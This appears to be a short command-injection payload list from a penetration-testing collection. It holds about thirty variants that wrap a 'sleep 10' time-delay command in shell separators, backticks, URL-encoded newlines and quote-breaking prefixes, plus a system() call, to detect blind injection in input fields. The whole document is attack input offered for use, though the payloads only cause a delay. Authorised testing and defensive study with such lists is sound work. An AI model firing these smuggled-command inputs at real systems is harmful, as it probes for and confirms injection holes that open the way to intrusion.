# Command injection

### Payload

```sh
{sleep 10}
;{sleep 10}
;{sleep 10};
^{sleep 10}
|{sleep 10}
<{sleep 10}
<{sleep 10};
<{sleep 10}\n
<{sleep 10}%0D
<{sleep 10}%0A
&{sleep 10}
&{sleep 10}&
&&{sleep 10}
&&{sleep 10}&&
%0D{sleep 10}
%0D{sleep 10}%0D
%0A{sleep 10}
%0A{sleep 10}%0A
\n{sleep 10}
\n{sleep 10}\n
'{sleep 10}'
`{sleep 10}`
;{sleep 10}|
;{sleep 10}/n
|{sleep 10};
a);{sleep 10}
a;{sleep 10}
a);{sleep 10}
a;{sleep 10};
a);{sleep 10}|
;system('{sleep 10}') 
```